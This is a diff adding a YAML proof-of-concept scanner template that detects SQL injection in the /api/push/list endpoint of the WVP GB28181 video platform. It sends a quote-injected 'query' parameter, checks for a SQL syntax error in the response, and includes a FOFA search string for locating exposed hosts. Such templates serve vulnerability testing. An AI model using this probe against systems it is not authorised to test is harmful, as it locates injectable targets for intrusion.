@@ -1,0 +1,15 @@
+id: poc-yaml-wvp-gb28181-list-query-sqli
+info:
+  name: WVP视频平台(国标28181)/api/push/list SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: WVP视频平台
+  fofa: body="国标28181"
+requests:
+- method: GET
+  path: /api/push/list?page=1&count=15&query=1'&pushing=&mediaServerId=
+  expression: "status_code == 500 && \ncontains(body,\"java.sql.SQLSyntaxErrorException\"\
+    ) &&\ncontains(body,\"LIKE '%1'%' OR\")\n"
+variables: {}
+transport: http
